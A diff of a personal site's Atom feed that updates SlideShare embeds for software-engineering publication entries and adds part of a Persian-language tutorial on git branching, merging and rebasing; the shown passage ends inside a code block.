@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://mjafar.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mjafar.me/" rel="alternate" type="text/html" /><updated>2020-09-19T03:53:35+00:00</updated><id>https://mjafar.me/feed.xml</id><title type="html">Mohammad Jafar Mashhadi</title><subtitle>My portfolio website I guess?</subtitle><entry><title type="html">MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems</title><link href="https://mjafar.me/publications/UCalgary-graduate-thesis.html" rel="alternate" type="text/html" title="MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems" /><published>2020-09-10T15:00:00+00:00</published><updated>2020-09-10T15:00:00+00:00</updated><id>https://mjafar.me/publications/UCalgary-graduate-thesis</id><content type="html" xml:base="https://mjafar.me/publications/UCalgary-graduate-thesis.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://mjafar.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mjafar.me/" rel="alternate" type="text/html" /><updated>2020-10-04T01:14:38+00:00</updated><id>https://mjafar.me/feed.xml</id><title type="html">Mohammad Jafar Mashhadi</title><subtitle>My portfolio website I guess?</subtitle><entry><title type="html">MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems</title><link href="https://mjafar.me/publications/UCalgary-graduate-thesis.html" rel="alternate" type="text/html" title="MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems" /><published>2020-09-10T15:00:00+00:00</published><updated>2020-09-10T15:00:00+00:00</updated><id>https://mjafar.me/publications/UCalgary-graduate-thesis</id><content type="html" xml:base="https://mjafar.me/publications/UCalgary-graduate-thesis.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
 &lt;p&gt;Inferring behavior model of a running software system is quite useful for several automated software engineering tasks, such as program comprehension, anomaly detection, and testing. Most existing dynamic model inference techniques are white-box, i.e. they require source code to be instrumented to get run-time traces. However, in many systems, instrumenting the entire source code is not possible (e.g., when using black-box third-party libraries) or might be very costly. 
 Unfortunately, most black-box techniques that detect states over time are either univariate, or make assumptions on the data distribution, or have limited power for learning over a long period of past behavior. 
 To overcome the above issues, in this thesis, I proposed a hybrid deep neural network that accepts as input a set of time series, one per input/output signal of the system, and applies a set of convolutional and recurrent layers to learn the non-linear correlations between signals and the patterns, over time. 
@@ -28,9 +28,7 @@ The tuning performance is compared to using the same hyper-parameters that worke
 &lt;a href=&quot;https://github.com/MJafarMashhadi/pprzlink&quot;&gt;repository&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;presentation-slides&quot;&gt;Presentation Slides&lt;/h2&gt;
-
-&lt;iframe src=&quot;https://www.slideshare.net/slideshow/embed_code/key/KYetgcTa9ummEU&quot; width=&quot;427&quot; height=&quot;356&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
-&lt;div style=&quot;margin-bottom:5px&quot;&gt; &lt;strong&gt; &lt;a href=&quot;https://www.slideshare.net/secret/KYetgcTa9ummEU&quot; title=&quot;Black-box Behavioral Model Inference for Autopilot Software Systems&quot; target=&quot;_blank&quot;&gt;Black-box Behavioral Model Inference for Autopilot Software Systems&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;https://www.slideshare.net/MohammadJafarMashhad&quot; target=&quot;_blank&quot;&gt;Mohammad Jafar Mashhadi&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="deep learning" /><category term="software engineering" /><category term="thesis" /><summary type="html">Abstract Inferring behavior model of a running software system is quite useful for several automated software engineering tasks, such as program comprehension, anomaly detection, and testing. Most existing dynamic model inference techniques are white-box, i.e. they require source code to be instrumented to get run-time traces. However, in many systems, instrumenting the entire source code is not possible (e.g., when using black-box third-party libraries) or might be very costly. Unfortunately, most black-box techniques that detect states over time are either univariate, or make assumptions on the data distribution, or have limited power for learning over a long period of past behavior. To overcome the above issues, in this thesis, I proposed a hybrid deep neural network that accepts as input a set of time series, one per input/output signal of the system, and applies a set of convolutional and recurrent layers to learn the non-linear correlations between signals and the patterns, over time. I have applied this approach on two real UAV autopilot case studies: one from our industry partner, MicroPilot (MP in short), with half a million lines of C code, and one widely used open source solution: Paparazzi. I ran more than 1200 system-level tests in total (to generate the input data) and inferred the system’s internal state, over time. In case of Paparazzi, as it did not include system tests like MP, I created a tool that generates and executes meaningful test scenarios. Comparison with several traditional time series change point detection techniques showed that this approach improves their performance by up to 102% in MP’s case and 94% in Paparazzi’s, in terms of finding state change points, measured by F1 score. I also showed that this state classification algorithm provides on average 90.45% F1 score for MP and 82.23% for Paparazzi, which improves traditional classification algorithms by up to 17% in MP’s case and 20% in Paparazzi’s.</summary></entry><entry><title type="html">Hybrid Deep Neural Networks to Infer State Models of Black-Box Systems</title><link href="https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling.html" rel="alternate" type="text/html" title="Hybrid Deep Neural Networks to Infer State Models of Black-Box Systems" /><published>2020-08-22T17:10:00+00:00</published><updated>2020-08-22T17:10:00+00:00</updated><id>https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling</id><content type="html" xml:base="https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
+&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/KYetgcTa9ummEU&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="deep learning" /><category term="software engineering" /><category term="thesis" /><summary type="html">Abstract Inferring behavior model of a running software system is quite useful for several automated software engineering tasks, such as program comprehension, anomaly detection, and testing. Most existing dynamic model inference techniques are white-box, i.e. they require source code to be instrumented to get run-time traces. However, in many systems, instrumenting the entire source code is not possible (e.g., when using black-box third-party libraries) or might be very costly. Unfortunately, most black-box techniques that detect states over time are either univariate, or make assumptions on the data distribution, or have limited power for learning over a long period of past behavior. To overcome the above issues, in this thesis, I proposed a hybrid deep neural network that accepts as input a set of time series, one per input/output signal of the system, and applies a set of convolutional and recurrent layers to learn the non-linear correlations between signals and the patterns, over time. I have applied this approach on two real UAV autopilot case studies: one from our industry partner, MicroPilot (MP in short), with half a million lines of C code, and one widely used open source solution: Paparazzi. I ran more than 1200 system-level tests in total (to generate the input data) and inferred the system’s internal state, over time. In case of Paparazzi, as it did not include system tests like MP, I created a tool that generates and executes meaningful test scenarios. Comparison with several traditional time series change point detection techniques showed that this approach improves their performance by up to 102% in MP’s case and 94% in Paparazzi’s, in terms of finding state change points, measured by F1 score. I also showed that this state classification algorithm provides on average 90.45% F1 score for MP and 82.23% for Paparazzi, which improves traditional classification algorithms by up to 17% in MP’s case and 20% in Paparazzi’s.</summary></entry><entry><title type="html">Hybrid Deep Neural Networks to Infer State Models of Black-Box Systems</title><link href="https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling.html" rel="alternate" type="text/html" title="Hybrid Deep Neural Networks to Infer State Models of Black-Box Systems" /><published>2020-08-22T17:10:00+00:00</published><updated>2020-08-22T17:10:00+00:00</updated><id>https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling</id><content type="html" xml:base="https://mjafar.me/publications/ASE-2020-deep-neural-net-autopilot-behvaioural-modeling.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
 &lt;p&gt;Inferring behavior model of a running software system is quite useful for several automated software engineering tasks
 such as program comprehension, anomaly detection, and testing. Most existing dynamic model inference techniques are
 white-box, i.e., they require source code to be instrumented to get run-time traces. However, in many systems,
@@ -57,9 +55,7 @@ implementation as well as the algorithms. The paper will discuss the root cause 
 future improvement.&lt;/p&gt;
 
 &lt;h2 id=&quot;presentation-slides&quot;&gt;Presentation Slides&lt;/h2&gt;
-&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/z5hAbZ8HZfihvr&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
-&lt;div style=&quot;margin-bottom:5px&quot;&gt; 
-&lt;/div&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Abstract Dynamic model inference techniques have been the center of many research projects recently. There are now multiple open source implementations of state-of-the-art algorithms, which provide basic abstraction and merging capabilities. Most of these tools and algorithms have been developed with one particular application in mind, which is program comprehension. The output models can abstract away the details of the program and represent the software behaviour in a concise and easy to understand form. However, one application context that is less studied is using such inferred models for debugging, where the behaviour to abstract is a faulty behaviour (e.g., a set of execution traces including a failed test case). We tried to apply some of the existing model inference techniques in a real-world industrial context to support program comprehension for debugging. Our initial experiments have shown many limitations both in terms of implementation as well as the algorithms. The paper will discuss the root cause of the failures and proposes ideas for future improvement.</summary></entry><entry><title type="html">Interactive semi-automated specification mining for debugging: An experience report</title><link href="https://mjafar.me/publications/IST-2019-interactive-debugging.html" rel="alternate" type="text/html" title="Interactive semi-automated specification mining for debugging: An experience report" /><published>2019-04-24T17:10:00+00:00</published><updated>2019-04-24T17:10:00+00:00</updated><id>https://mjafar.me/publications/IST-2019-interactive-debugging</id><content type="html" xml:base="https://mjafar.me/publications/IST-2019-interactive-debugging.html">&lt;p&gt;&lt;strong&gt;Also presented at ASE 2019’s &lt;a href=&quot;https://2019.ase-conferences.org/details/ase-2019-Journal-First-Presentations/13/Interactive-semi-automated-specification-mining-for-debugging-An-experience-report&quot;&gt;journal-first presentations track&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
+&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/z5hAbZ8HZfihvr&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Abstract Dynamic model inference techniques have been the center of many research projects recently. There are now multiple open source implementations of state-of-the-art algorithms, which provide basic abstraction and merging capabilities. Most of these tools and algorithms have been developed with one particular application in mind, which is program comprehension. The output models can abstract away the details of the program and represent the software behaviour in a concise and easy to understand form. However, one application context that is less studied is using such inferred models for debugging, where the behaviour to abstract is a faulty behaviour (e.g., a set of execution traces including a failed test case). We tried to apply some of the existing model inference techniques in a real-world industrial context to support program comprehension for debugging. Our initial experiments have shown many limitations both in terms of implementation as well as the algorithms. The paper will discuss the root cause of the failures and proposes ideas for future improvement.</summary></entry><entry><title type="html">Interactive semi-automated specification mining for debugging: An experience report</title><link href="https://mjafar.me/publications/IST-2019-interactive-debugging.html" rel="alternate" type="text/html" title="Interactive semi-automated specification mining for debugging: An experience report" /><published>2019-04-24T17:10:00+00:00</published><updated>2019-04-24T17:10:00+00:00</updated><id>https://mjafar.me/publications/IST-2019-interactive-debugging</id><content type="html" xml:base="https://mjafar.me/publications/IST-2019-interactive-debugging.html">&lt;p&gt;&lt;strong&gt;Also presented at ASE 2019’s &lt;a href=&quot;https://2019.ase-conferences.org/details/ase-2019-Journal-First-Presentations/13/Interactive-semi-automated-specification-mining-for-debugging-An-experience-report&quot;&gt;journal-first presentations track&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
 &lt;h3 id=&quot;context&quot;&gt;Context&lt;/h3&gt;
@@ -88,4 +84,429 @@ techniques on a real-world debugging context.&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
 &lt;p&gt;The main conclusion of this study is that the idea of an “interactive” specification mining rather than a fully 
-automated mining tool is NOT impractical and indeed is useful for the debugging use case.&lt;/p&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Also presented at ASE 2019’s journal-first presentations track.</summary></entry></feed>
+automated mining tool is NOT impractical and indeed is useful for the debugging use case.&lt;/p&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Also presented at ASE 2019’s journal-first presentations track.</summary></entry><entry><title type="html">چگونه از git استفاده کنیم–بخش دوم–branch, merge و rebase</title><link href="https://mjafar.me/blog/2015/09/how-to-use-git-part2/" rel="alternate" type="text/html" title="چگونه از git استفاده کنیم&amp;ndash;بخش دوم&amp;ndash;branch, merge و rebase" /><published>2015-09-27T00:15:49+00:00</published><updated>2015-09-27T00:15:49+00:00</updated><id>https://mjafar.me/blog/2015/09/how-to-use-git-part2</id><content type="html" xml:base="https://mjafar.me/blog/2015/09/how-to-use-git-part2/">&lt;p&gt;این مطلب در ادامه‌ی &lt;a href=&quot;/blog/2015/08/how-to-use-git/&quot; target=&quot;_blank&quot;&gt;چگونه از git استفاده کنیم&lt;/a&gt; نوشته شده. پیشنهاد می‌کنم قبل از مطالعه‌ی این مطلب به پست قبلی هم یک نگاه بندازید. در ادامه‌ی مطلب بر خلاف مطلب قبلی برای راحت تر شدن فهم موضوع فرض شده که از گیت برای مدیریت کد منبع یک نرم‌افزار استفاده می‌شه، هرچند بدیهتاً کاربرد گیت محدود به این موضوع نیست.&lt;/p&gt;
+
+&lt;h3 id=&quot;شاخه-یا-branch&quot;&gt;شاخه یا branch&lt;/h3&gt;
+&lt;p&gt;در فرایند توسعه‌ی نرم‌افزار خیلی وقت‌ها پیش میاد که لازم باشه تغییرات گسترده‌ای در کد ایجاد شه، فیچری اضافه بشه، کدی به صورت تست به برنامه اضافه بشه و… که تا مدتی (مثل چند روز یا چند ماه) ناپایداره یا مشخص نیست که قرار هست به کد اصلی اضافه بشه یا نه. برای همین نیاز داریم که یه تعداد کامیت انجام بدیم بدون اینکه به کد پایدار برنامه خللی وارد شه و توی کار بقیه دخالتی انجام شه. اولین راهی که به ذهن می‌رسه اینه که یک کپی از مخزن ایجاد کنیم و کامیت‌ها رو روی اون ببریم جلو تا وقتی که کد به حالت پایدار برسه و بشه این کامیت‌ها رو روی کد اصلی هم اعمال کرد.&lt;/p&gt;
+
+&lt;p&gt;گیت برای همچین شرایطی راه حل ساده تری در اختیارمون گذاشته به اسم branch (شاخه). در این شرایط بجای کپی گرفتن از مخزن کافیه که یک شاخه‌ی جدید درست کنیم و روی اون شاخه کار کنیم. کامیت‌هایی که روی شاخه‌ی جداگانه انجام می‌شن ایزوله هستند و تا زمانی که نخوایم با کد اصلی ترکیب نمی‌شن. هر مخزن gitای که ایجاد میشه به صورت پیش‌فرض شاخه‌ای به اسم master داره و کامیت‌هامون روی master به صورت خطی، جلو می‌رن. اگر تاریخچه‌ی git رو مثل یک درخت در نظر بگیریم شاخه‌ی master مثل تنه‌ی درخت می‌مونه.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;background-image: none; padding-top: 0px; padding-left: 0px; padding-right: 0px; border-width: 0px;&quot; src=&quot;https://git-scm.com/book/en/v2/book/03-git-branching/images/basic-branching-6.png&quot; alt=&quot;Work continues on &amp;#96;iss53&amp;#96;.&quot; width=&quot;640&quot; height=&quot;305&quot; border=&quot;0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;توی این تصویر شاخه‌ای به اسم iss53 از شاخه‌ی master در کامیت C2 جدا شده و کار روی هر دو برنچ بدون دخالت در کد همدیگه جلو رفته (&lt;a href=&quot;https://git-scm.com/book/en/v2/Git-Branching-Basic-Branching-and-Merging&quot; target=&quot;_blank&quot;&gt;منبع عکس&lt;/a&gt;). کامیت‌های C3 و C5 از تغییراتی که در C4 اعمال شده خبردار نیستند و برعکس.&lt;/p&gt;
+
+&lt;p&gt;برای ساخت یک شاخه‌ی جدید:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git branch gholi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;این دستور یک شاخه‌ی جدید به اسم قُلی از کامیتی که الان روش هستیم جدا می‌کنه اما وارد اون شاخه نمی‌شه. برای اینکه بریم روی اون شاخه و کار رو ادامه بدیم، به اصطلاح باید checkout کنیم. با این دستور:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout gholi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;راه میانبری هم برای ساخت شاخه و بلافاصله checkout کردن روش هست (با اندکی تفاوت):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; gholi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;برای حذف یک شاخه می‌تونیم از دستور زیر استفاده کنیم:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; gholi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;merge&quot;&gt;Merge&lt;/h3&gt;
+&lt;p&gt;بعد از اتمام کار و نهایی شدن کد یک شاخه، لازم می‌شه که کدهای اون شاخه با یک شاخه‌ی دیگه (معمولاً master) ترکیب شه. گاهی اوقات هم می‌خوایم تغییراتی که در یک شاخه‌ی سومی وجود داره رو وارد شاخه‌ای که درحال کار روش هستیم کنیم. در این مواقع باید از دستور merge استفاده کنیم. برای merge اول باید وارد شاخه‌ی مقصد شیم (با دستور checkout) و سپس با دستور مناسب شاخه‌ی ثانویه رو با مقصد ترکیب کنیم.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout dest
+git merge &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;یادتون باشه که &lt;code class=&quot;highlighter-rouge&quot;&gt;git merge X&lt;/code&gt; شاخه‌ی &lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt; رو با شاخه‌ی فعلی ترکیب می‌کنه. برای اینکه متوجه شیم که شاخه‌ی فعلی چی هست می‌تونیم از &lt;code class=&quot;highlighter-rouge&quot;&gt;git status&lt;/code&gt; کمک بگیریم.&lt;/p&gt;
+
+&lt;p&gt;اگر خوش‌شانس باشیم مرج fast-forward هست. یعنی بدون هیچ کانفلیکتی انجام می‌شه. وگرنه باید کانفلیکت‌ها رو برطرف کنیم و بعد از تموم شدن یک کامیت merge انجام بدیم. با استفاده از پرچم ‎&lt;code class=&quot;highlighter-rouge&quot;&gt;--no-ff&lt;/code&gt; می‌تونیم کاری کنیم که در هر صورت کامیت مرج ساخته بشه. چه مرج بتونه fast-forward و بدون کامیت اضافه انجام بشه و چه کانفلیکت داشته باشه و کامیت مرج ضروری باشه.&lt;/p&gt;
+
+&lt;h3 id=&quot;روشهای-پیشنهادی-استفاده-از-شاخهها&quot;&gt;روش‌های پیشنهادی استفاده از شاخه‌ها&lt;/h3&gt;
+&lt;p&gt;workflowهای پیشنهادی برای استفاده از git و مدل استفاده از branchها خیلی متنوع هستند و هرکدوم مزایا و معایبی دارن. هرتیم با توجه به سطح افراد، نوع کار، حجم کدها، متودولوژی مورد استفاده و بقیه‌ی عوامل مؤثر یک مدل رو انتخاب می‌کنه و طبق اون جلو می‌ره یا اینکه از ترکیبی از چند مدل استفاده می‌کنه. من اینجا دو مدلی که ازشون تو پروژه‌های مختلف استفاده کردم رو معرفی می‌کنم. چیزی که در هردو مدل مشترک هست اینه که شاخه‌ی master حاوی یک نسخه‌ی پایدار از برنامه‌س و تحت هیچ شرایطی نباید نسخه‌ی ناپایدار روی master بیاد. در هر لحظه که نیاز باشه باید بشه آخرین نسخه‌ی روی master رو بدون مشکل اجرا کرد.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;مدل اول:&lt;/strong&gt; این مدل تشابه زیادی با مدل github داره (&lt;a href=&quot;http://scottchacon.com/2011/08/31/github-flow.html&quot; target=&quot;_blank&quot;&gt;اطلاعات بیشتر&lt;/a&gt;). شاخه‌ی master حفاظت شده (protected)ه و بجز مدیر فنی پروژه کسی اجازه‌ی کامیت کردن روی master رو نداره. جز اینکه همه باید حواسشون باشه که روی master کامیت نکنند، خود git هم اجازه‌ی این کار رو نمی‌ده. هر عضو پروژه برای رفع باگ، اضافه کردن فیچر، آزمایش یک کد و هر تغییر دیگه‌ای که لازم داره، از آخرین نسخه‌ی روی master یک شاخه جدا می‌کنه و کارش رو انجام می‌ده. هروقت که کارش تموم شد و آماده‌ی ترکیب شدن با شاخه‌ی master بود به فردی که اجازه‌ی دسترسی به master داره خبر می‌ده تا کدش رو وارد master کنه. بعد از این شاخه‌ای که کارش تموم شده حذف می‌شه (با دستور &lt;code class=&quot;highlighter-rouge&quot;&gt;git branch -d gholi&lt;/code&gt;). با همین روند دوباره یک شاخه‌ی جدید برای کارهای آینده ایجاد می‌شه و کار تکمیل میشه و merge و الخ.&lt;/p&gt;
+
+&lt;p&gt;در این مدل هر فیچری به طور کاملا جدا و ایزوله از بخش‌های دیگه قابل آزمایش و تکمیله. این امکان وجود داره که ادامه‌ی کار روی یک فیچر موقتاً رها بشه و کار دیگه‌ای که پیش اومده انجام بشه و بعداً دوباره روی اون فیچر کار شه. در این مدل رفع conflictها همه با یک نفر (کسی که کدها رو با master مرج می‌کنه) هست و چون فردی برای این کار انتخاب می‌شه که تسلط بیشتری روی کد داره، احتمال خطا در merge کمتر می‌شه. اما اگر دوتا شاخه لازم باشه که با هم merge شن تا یک شاخه تغییرات شاخه‌ی دیگری رو داشته باشه کار یکم سخت می‌شه و رفع conflictها گیج کننده.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;مدل دوم:&lt;/strong&gt; شاخه‌ی master همچنان حفاظت شده‌ست، اما تمام کارها بجای اینکه branchهای جدا داشته باشند روی یک شاخه (مثلا به اسم dev) انجام می‌شن. همچنان کارهایی که معلوم نیست قراره روی کد اصلی بیان یا نه یا کارهایی که مدت طولانی کد رو ناپایدار و غیرقابل استفاده برای بقیه می‌کنه روی شاخه‌ی جداگانه انجام می‌شن با این تفاوت که این شاخه‌ها از dev منشعب می‌شن نه master.&lt;/p&gt;
+
+&lt;p&gt;این مدل برای تیم‌های کوچیک بهتره. استفاده از git براشون سربار کمتری داره و هرکسی کارهای ناقص بقیه رو می‌تونه داشته باشه (هم ویژگی مثبتی هست هم منفی). چون تغییرات کم کم باهم ترکیب می‌شن و merge نمی‌مونه برای آخر احتمال conflict خوردن کمتر میشه و رفعشون هم ساده تر.&lt;/p&gt;
+
+&lt;p&gt;توی این مدل پیشنهاد می‌شه که روی هر شاخه‌ی x برای اینکه تغییرات سرور با تغییرات خودمون ترکیب بشه (اصطلاحا ترکیب x با origin/x) بجای merge از rebase استفاده شه. این کار دو مرحله‌ی fetch و rebase رو داره.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git fetch &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git merge
+&lt;span class=&quot;c&quot;&gt;# is equal to&lt;/span&gt;
+git pull
+
+git fetch &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git rebase
+&lt;span class=&quot;c&quot;&gt;# is equal to&lt;/span&gt;
+git pull &lt;span class=&quot;nt&quot;&gt;--rebase&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;تفاوت-rebase-و-merge&quot;&gt;تفاوت Rebase و Merge&lt;/h3&gt;
+&lt;p&gt;وقتی که دو شاخه با‌هم merge می‌شن همه‌ی تغییرات شاخه‌ی ثانویه با هم جمع می‌شن و به صورت یک commit به آخر شاخه‌ی مقصد اضافه می‌شن. در rebase، شاخه‌ی ثانویه از ریشه‌ش جدا می‌شه و به انتهای شاخه‌ی اولیه متصل میشه.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Initial:
+---A---B---C---D---E
+   |---X---Y
+
+After merge:
+---A---B---C---D---E--F
+   |---X---Y--------/
+
+After rebase:
+---A---B---C---D---E---X---Y
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;بعد از rebase اینطور &lt;em&gt;به نظر می‌رسه&lt;/em&gt; که کامیت‌های X و Y بعد از E انجام شدن. یعنی کسی که اون‌ها رو کامیت کرده اول صبر کرده کار بقیه تموم شه و به E برسه بعد کار خودش رو شروع کرده، هرچند در واقعیت همه کارها رو به صورت موازی پیش می‌برن. به این صورت شاخه به شکل خطی جلو می‌ره و دنبال کردن تغییرات خیلی ساده‌تره.&lt;/p&gt;
+
+&lt;p&gt;موقعی که rebase انجام می‌دیم چون کامیت‌هامون دونه دونه به آخر شاخه‌ی مقصد اعمال می‌شن به ازای هر کامیت احتمال یک بار conflict خوردن هست. یعنی در بدترین حالت به تعداد کامیت‌های روی شاخه‌ی ثانویه می‌شه کانفلیکت ایجاد شه. البته چون کامیت‌ها دونه دونه دارن اعمال میشن حجم تغییرات در هر کامیت کم هست و احتمال کانفلیکت خیلی کم میشه، به همین دلیل هم کانفلیکت‌ها هم معمولا جزئی و ساده هستن و اذیت خیلی خاصی ندارن.&lt;/p&gt;
+
+&lt;p&gt;فرض کنید شاخه‌ی dev رو می‌خوایم با master مرج کنیم. اول باید وارد شاخه‌ی مقصد (master) بشیم و بعد:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout master
+git merge &lt;span class=&quot;nt&quot;&gt;--no-ff&lt;/span&gt; dev
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;اگر کانفلیکتی وجود داشت رفع می‌کنیم و یک کامیت merge انجام می دیم.&lt;/p&gt;
+
+&lt;p&gt;اینبار فرض کنید که میخوایم شاخه‌ی dev رو روی origin/dev ری‌بیس کنیم. برخلاف merge باید اول وارد شاخه‌ی مبدا شیم و:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git checkout dev
+git rebase origin/dev 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;گیت شروع می‌کنه کامیت‌های روی dev رو به آخر origin/dev اضافه کردن. اگر در این حین به کانفلیکتی برخورد کنه یک پیام خطا تولید می‌شه و وظیفه‌ی ماست که کانفلیکت رو برطرف کنیم. بعد از برطرف کردن کانفلیکت‌ها باید rebase رو ادامه بدیم&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git rebase &lt;span class=&quot;nt&quot;&gt;--continue&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;بعضی اوقات در حین rebase یک کامیت عملا هیچ تغییری در مقصد ایجاد نمی‌کنه. این وقتی به وجود میاد که تمام تغییراتی که توی اون کامیت وجود داشتن قبلا یه جایی به یک طریقی روی مقصد داده شده باشند. تو این مواقع هم git ارور تولید می‌کنه و باید از روی اون کامیت بپریم.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git rebase &lt;span class=&quot;nt&quot;&gt;--skip&lt;/span&gt;
